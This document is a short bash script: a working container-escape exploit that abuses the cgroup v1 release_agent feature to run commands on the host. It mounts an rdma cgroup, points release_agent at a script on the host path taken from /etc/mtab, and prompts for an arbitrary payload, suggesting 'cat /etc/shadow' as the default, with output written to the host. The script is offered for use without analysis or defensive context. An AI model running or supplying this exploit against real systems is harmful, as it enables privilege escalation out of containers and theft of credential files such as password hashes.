touch errorfile
mkdir /tmp/cgrp 2>/dev/null && mount -t cgroup -o rdma cgroup /tmp/cgrp 2> errorfile
mkdir /tmp/cgrp/x 2>/dev/null
if [[ -s errorfile ]]; then
  echo "Mount of rdma agent is impossible"
  echo "Host is invulnerable for this exploit"
else
  echo 1 > /tmp/cgrp/x/notify_on_release
  host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
  echo "$host_path/cmd" > /tmp/cgrp/release_agent

  echo '#!/bin/sh' > /cmd
  echo "Write your payload (result will be written in /output)"
  echo "As defeault you can use cat /etc/shadow (but also you can mkdir for example)"
  read payload
  echo "$payload > $host_path/output" >> /cmd
  chmod a+x /cmd

  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
fi
rm errorfile
